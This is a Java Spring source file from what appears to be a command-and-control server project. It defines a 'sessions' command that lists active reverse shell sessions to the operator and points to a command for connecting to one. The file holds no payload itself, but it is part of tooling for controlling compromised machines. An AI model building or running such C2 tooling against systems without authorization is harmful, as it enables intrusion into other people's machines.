package com.mtattab.c2cServer.service.commands.manager;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.SocketCommunicationDTOModel;
import com.mtattab.c2cServer.model.enums.commands.ManagerCommands;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.List;
import java.util.stream.Collectors;

@Component
public class SessionsCommand implements Command {
    @Autowired
    ActiveSessionsObservable activeSessionsObservable;

    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        List<SocketCommunicationDTOModel> activeReverseShellSessions =  activeSessionsObservable.getActiveReverseShellSessions().stream()
                .map(SocketCommunicationDTOModel::new).collect(Collectors.toList());

        if (activeReverseShellSessions.isEmpty()){
            SocketUtil.sendMessage(currentSocket, new TextMessage(
                    DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                            .msg("No session found")
                            .build()

                    )));
        }else {
            SocketUtil.sendMessage(currentSocket, new TextMessage(
                    DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                            .webSocketSessionSet(activeReverseShellSessions)
                            .msg("NOTE: You can use '"+ ManagerCommands.CONNECT_TO_ACTIVE_SESSION.getExample()+"' to connect to the session")
                            .build()

                    )));
        }


    }
}